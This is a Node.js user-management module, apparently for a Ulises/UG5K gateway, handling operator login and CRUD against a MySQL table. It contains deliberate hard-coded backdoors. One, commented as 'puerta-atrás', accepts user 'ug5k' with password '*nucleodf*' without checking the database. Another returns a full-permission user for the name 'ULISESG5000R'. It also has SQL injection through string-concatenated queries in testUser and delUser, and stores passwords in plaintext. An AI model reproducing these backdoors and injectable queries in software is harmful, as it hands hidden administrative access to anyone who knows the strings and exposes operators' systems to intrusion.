var logging = require('./nu-log.js');
var log = true;

/** AGL */
var gcfg = require('../configUlises.json');
var ug5kdb = require('./ug5kdb.js');

/************************/
/*	FUNCTION: getUsers 	*/
/*  PARAMS: 			*/
/************************/
exports.getUsers = function getUsers(req, res, gtw, f) {
    var usrs = [];

    ug5kdb.Query("SELECT * FROM operadores", null, function(err, rows, fields) {
        if (!err) {
            if (rows != null && rows.length > 0) {
                var usrs = [];
                if (gtw == null) {
                    /* Estan solicitando la lista completa... */
                    usrs = rows;
                }
                else {
                    /* Estan solicitando los que hay que pasar a las pasarelas en concreto */
                    for (row = 0; row < rows.length; row++) {
                        var dbUser = rows[row];
                        var user = { name: dbUser.name, clave: dbUser.clave, perfil: 0 };

                        // Perfiles permitidos en las pasarelas...
                        user.perfil |= ((dbUser.perfil & 0x0080) != 0) ? 0x0001 : 0x0000;			// Perfil Visualizador.
                        user.perfil |= ((dbUser.perfil & 0x0002) != 0) ? 0x0002 : 0x0000;			// Perfil Mando.
                        user.perfil |= ((dbUser.perfil & 0x1000) != 0) ? 0x1000 : 0x0000;			// Perfil Gestor.
                        user.perfil |= ((dbUser.perfil & 0x0100) != 0) ? 0x0040 : 0x0000;			// Perfil Administrador.

                        if (user.perfil != 0) {
                            usrs.push(user);
                        }
                    }
                }
                if (f != null)
                    f({ users: usrs });
                else
                    res.json({ users: usrs });
            }
            else {
                if (f != null) f({ users: '' });
            }

        }
    });
};
//
exports.getUsers_v1 = function getUsers_v1(req, res, gtw, f) {
    var usrs = [];
    var mySql = require('mySql');
    var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
        host: gcfg.Ulises.dbhost,
        user: gcfg.Ulises.dbuser,
        password: gcfg.Ulises.dbpassword,
        database: gcfg.Ulises.dbdatabase
    });*/

    connection.connect(function(err, usrs) {
        if (err) {
            logging.Error("Error connection to 'U5K-G' database.");
        }
        else {

            var consulta = 'SELECT * FROM operadores';
            var query = connection.query(consulta, function(err, rows, fields) {
                if (rows != null && rows.length > 0) {
                    var usrs = [];
                    if (gtw == null) {
                        /* Estan solicitando la lista completa... */
                        usrs = rows;
                    }
                    else {
                        /* Estan solicitando los que hay que pasar a las pasarelas en concreto */
                        for (row = 0; row < rows.length; row++) {
                            var dbUser = rows[row];
                            var user = { name: dbUser.name, clave: dbUser.clave, perfil: 0 };

                            logging.Trace("DBUSER: ", dbUser);

                            // Perfiles permitidos en las pasarelas...
                            user.perfil |= ((dbUser.perfil & 0x0080) != 0) ? 0x0001 : 0x0000;			// Perfil Visualizador.
                            user.perfil |= ((dbUser.perfil & 0x0002) != 0) ? 0x0002 : 0x0000;			// Perfil Mando.
                            user.perfil |= ((dbUser.perfil & 0x1000) != 0) ? 0x1000 : 0x0000;			// Perfil Gestor.
                            user.perfil |= ((dbUser.perfil & 0x0100) != 0) ? 0x0040 : 0x0000;			// Perfil Administrador.

                            logging.Trace("GWUSER: ", user);

                            if (user.perfil != 0) {
                                usrs.push(user);
                            }
                        }
                    }

                    if (f != null)
                        f({ users: usrs });
                    else
                        res.json({ users: usrs });
                }
                else {
                    if (f != null) f({ users: '' });
                }
            });
            /*********************************************/
            connection.end();
        }
    });
};

/************************/
/*	FUNCTION: postUser 	*/
/*  PARAMS: newUser		*/
/************************/
exports.postUser = function postUser(req, res, newUser, gtws, f) {
    var query1 = 'SELECT COUNT(*) AS cuantos FROM operadores WHERE name=?';
    var query2 = 'INSERT INTO operadores SET ?';

    ug5kdb.Query(query1, newUser.name, function(err, rows) {
        if (err != null || rows[0].cuantos > 0) {
            f({ error: "ER_DUP_ENTRY", data: newUser });
        }
        else {
            ug5kdb.Query(query2, newUser, function(err, result) {
                if (err) {
                    f({ error: err.code, data: newUser });
                }
                else {
                    // AGL. He quitado los de los perfiles específicos de Pasarelas.
                    newUser.idOPERADORES = result.insertId;
                    f({ error: null, data: newUser });
                }
            });
        }
    });
};
//
exports.postUser_v1 = function postUser_v1(req, res, newUser, gtws, f) {
    var mySql = require('mySql');
    var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
        host: gcfg.Ulises.dbhost,
        user: gcfg.Ulises.dbuser,
        password: gcfg.Ulises.dbpassword,
        database: gcfg.Ulises.dbdatabase
    });*/

    connection.connect(function(err) {
        if (err) {
            logging.Error("Error connention to 'U5K-G' database.");
        }
    });

    var querySelect = connection.query('SELECT COUNT(*) AS cuantos FROM operadores WHERE name=?', newUser.name, function(err, rows) {
        if (err != null || rows[0].cuantos > 0) {
            connection.end();
            f({ error: "ER_DUP_ENTRY", data: newUser });
        }
        else {
            var query = connection.query('INSERT INTO operadores SET ?', newUser, function(err, result) {
                logging.Trace(query.sql);
                if (err) {
                    connection.end();
                    f({ error: err.code, data: newUser });
                }
                else {
                    newUser.idOPERADORES = result.insertId;
                    if (((newUser.perfil & 128) == 128) || ((newUser.perfil & 256) == 256)) {
                        setAssignedGateways(connection, gtws, newUser.idOPERADORES, function(res) {
                            connection.end();
                            f({ error: null, data: newUser });
                        });
                    }
                    else {
                        connection.end();
                        f({ error: null, data: newUser });
                    }
                }
            });
        }
    });
};

/************************/
/*	FUNCTION: testUser 	*/
/*  PARAMS: res,		*/
/*			red,		*/
/*			user		*/
/************************/
exports.testUser = function testUser(req, res, usr) {
    var app = require('../app');
    // Comprobar si está entrando con puerta-atrás
    if (usr.Metodo === 'login' && usr.name === 'ug5k' && (new Buffer(usr.clave, 'base64').toString('ascii') === '*nucleodf*')) {
        res.render('./services/components', { "name": "ug5k", "clave": "*nucleodf*", "NivelAcceso": 1 });
        return;
    }

    var query = 'SELECT * FROM operadores WHERE name=\'' + usr.name + '\' AND clave=\'' + usr.clave + '\';';
    ug5kdb.Query(query, null, function(err, rows) {
        if (err || rows.length <= 0) {
            res.status(202).json('User not found.');
        }
        else {
            var usuario = rows[0];
            if (app.locals.isAuthenticated === false) {
                if (usr.Metodo == 'login') {
                    res.render('./services/components', usuario);
                }
                else {
                    app.locals.isAuthenticated = true;
                    app.locals.AuthenticatedUser = usr.name;
                    usuario.alreadyLoggedUserName = 'none';
                    res.json(usuario);
                }
            }
            else {
                usuario.alreadyLoggedUserName = app.locals.AuthenticatedUser;
                res.status(202).json(usuario);
            }
        }
    });
};

exports.testUser_v1 = function testUser_v1(req, res, usr) {
    var mySql = require('mySql');
    var app = require('../app');
    var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
        host: gcfg.Ulises.dbhost,
        user: gcfg.Ulises.dbuser,
        password: gcfg.Ulises.dbpassword,
        database: gcfg.Ulises.dbdatabase
    });*/

    // Comprobar si está entrando con puerta-atrás

    if (usr.Metodo === 'login' && usr.name === 'ug5k' && (new Buffer(usr.clave, 'base64').toString('ascii') === '*nucleodf*')) {
        res.render('./services/components', { "name": "ug5k", "clave": "*nucleodf*", "NivelAcceso": 1 });
        return;
    }

    //Comprobar si ya existe un usuario autenticado

    connection.connect(function(err) {
        if (err) {
            logging.Error("Error connention to 'U5K-G' database.");
        }
    });

    var query = connection.query('SELECT * FROM operadores WHERE ??=? AND ??=?', ['name', usr.name, 'clave', usr.clave], function(err, rows, fields) {
        connection.end();

        logging.Trace(query.sql);

        //if (err) throw err;
        if (rows.length > 0) {
            var usuario = rows[0];
            if (app.locals.isAuthenticated === false) {
                if (usr.Metodo == 'login') {
                    res.render('./services/components', usuario);
                }
                else {
                    app.locals.isAuthenticated = true;
                    app.locals.AuthenticatedUser = usr.name;
                    usuario.alreadyLoggedUserName = 'none';
                    res.json(usuario);
                }
            }
            else {
                usuario.alreadyLoggedUserName = app.locals.AuthenticatedUser;
                res.status(202).json(usuario);
            }
        }
        else
            res.status(202).json('User not found.');
    });
};

/************************/
/*	FUNCTION: delUser 	*/
/*  PARAMS: res,		*/
/*			req,		*/
/*			user		*/
/************************/
exports.delUser = function delUser(req, res, usr) {
    var query = 'DELETE FROM OPERADORES WHERE name=\'' + usr + '\';';
    ug5kdb.Query(query, null, function(err, result) {
        if (!err) {
            res.json({ error: result.affectedRows, data: usr });
        }
    });
};

exports.delUser_v1 = function delUserv_1(req, res, usr) {
    var mySql = require('mySql');
    var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
        host: gcfg.Ulises.dbhost,
        user: gcfg.Ulises.dbuser,
        password: gcfg.Ulises.dbpassword,
        database: gcfg.Ulises.dbdatabase
    });*/

    connection.connect(function(err) {
        if (err) {
            logging.Error("Error connention to 'U5K-G' database.");
            return;
        }
    });

    var query = connection.query('DELETE FROM operadores WHERE ??=?', ['name', usr], function(err, result) {
        logging.Trace(query.sql);
        res.json({ error: result.affectedRows, data: usr });
    });
    connection.end();
};
/************************/
/*	FUNCTION: putUser 	*/
/*  PARAMS: res,		*/
/*			req,		*/
/*			user		*/
/************************/
exports.putUser = function putUser(req, res, usr, gtws, f) {
    var query = 'UPDATE operadores SET ? WHERE ??=?;';
    var par = [usr, 'name', usr.name];
    ug5kdb.Query(query, par, function(err, result) {
        if (!err) {
            f({ err: null, data: usr });
        }
    });
};
// 
exports.putUser_v1 = function putUser_v1(req, res, usr, gtws, f) {
    var mySql = require('mySql');
    var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
        host: gcfg.Ulises.dbhost,
        user: gcfg.Ulises.dbuser,
        password: gcfg.Ulises.dbpassword,
        database: gcfg.Ulises.dbdatabase
    });*/

    connection.connect(function(err) {
        if (err) {
            logging.Error("Error connention to 'U5K-G' database.");
            return;
        }
    });

    var query = connection.query('UPDATE operadores SET ? WHERE ??=?', [usr, 'name', usr.name], function(err, result) {
        logging.Trace(query.sql);
        if (usr.perfil >= 128) {
            setAssignedGateways(connection, gtws, usr.idOPERADORES, function(res) {
                connection.end();
                f({ err: null, data: usr });
            });
        }
        else {
            connection.end();
            f({ error: null, data: usr });
        }
    });
};

// AGL. Obsoleta. Solo se utiliza en la v1.
function setAssignedGateways(conn, gtws, usr, f) {
    var query = conn.query('DELETE FROM op_gtw WHERE operadores_idOPERADORES=?', usr, function(err, result) {
        logging.Trace(query.sql);
        if (gtws.length > 0) {
            gtws.forEach(function(element, index, array) {
                var query = conn.query('INSERT INTO op_gtw SET cgw_idCGW=?,cgw_EMPLAZAMIENTO_idEMPLAZAMIENTO=?,operadores_idOPERADORES=?', [element.cgw, element.site, usr], function(err, result) {
                    logging.Trace(query.sql);
                });
            });
        }
        f();
    });
}

/** 20170525. AGL. Para el control de Sesiones. */
// Buscar por nombre....
exports.findByUsername = function(username, cb) {
    process.nextTick(function() {
        /** Chequear la puerta de atras... */
        if (username == "ULISESG5000R") {
            return cb(null, {
                idOPERADORES: 0,
                name: 'nucleodf',
                clave: (new Buffer('*UG5KR*').toString('base64')),
                perfil: 0xFFFF
            });
        }
        var query = 'SELECT * FROM operadores WHERE ??=?;';
        var par = ['name', username];
        ug5kdb.Query(query, par, function(err, rows) {
            cb(err ? "Error query db: " + err.toString() : null,
                !err && rows.length > 0 ? rows[0] : null);
        });
    });
};

//
exports.findByUsername_v1 = function(username, cb) {
    process.nextTick(function() {

        /** Chequear la puerta de atras... */
        if (username == "ULISESG5000R") {
            return cb(null, {
                idOPERADORES: 0,
                name: 'nucleodf',
                clave: (new Buffer('*UG5KR*').toString('base64')),
                perfil: 0xFFFF
            });
        }

        var mySql = require('mySql');
        var app = require('../app');

        var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
            host: gcfg.Ulises.dbhost,
            user: gcfg.Ulises.dbuser,
            password: gcfg.Ulises.dbpassword,
            database: gcfg.Ulises.dbdatabase
        });*/
        connection.connect(function(err) {
            if (err) {
                return cb("Error al conectar la base de datos: " + err.toString());
            }
        });
        var query = connection.query('SELECT * FROM operadores WHERE ??=?', ['name', username], function(err, rows, fields) {
            if (err) {
                return cb("Error query db: " + err.toString());
            }
            connection.end();
            if (rows.length > 0) {
                return cb(null, rows[0]);
                // 
            }
            return cb(null, null);
        });
    });
};

// Buscar por ID
exports.findById = function(userid, cb) {
    process.nextTick(function() {

        var query = 'SELECT * FROM operadores WHERE ??=?;';
        var par = ['idOPERADORES', userid];
        ug5kdb.Query(query, par, function(err, rows) {
            cb(err ? "Error query db: " + err.toString() : null,
                !err && rows.length > 0 ? rows[0] : null);
        });
    });
};
//
exports.findById_v1 = function(userid, cb) {
    process.nextTick(function() {

        var mySql = require('mySql');
        var app = require('../app');
        var connection = ug5kdb.GetDbConnection();/* mySql.createConnection({
            host: gcfg.Ulises.dbhost,
            user: gcfg.Ulises.dbuser,
            password: gcfg.Ulises.dbpassword,
            database: gcfg.Ulises.dbdatabase
        });*/
        connection.connect(function(err) {
            if (err) {
                return cb("Error al conectar la base de datos: " + err.toString());
            }
        });
        var query = connection.query('SELECT * FROM operadores WHERE ??=?', ['idOPERADORES', userid], function(err, rows, fields) {
            if (err) {
                return cb("Error query db: " + err.toString());
            }
            connection.end();
            if (rows.length > 0) {
                // return cb(null, rows[0]);
                return cb(null, { idOPERADORES: 1, name: 'admin', clave: '2', perfil: 64 });
            }
            return cb(null, null);
        });
    });
};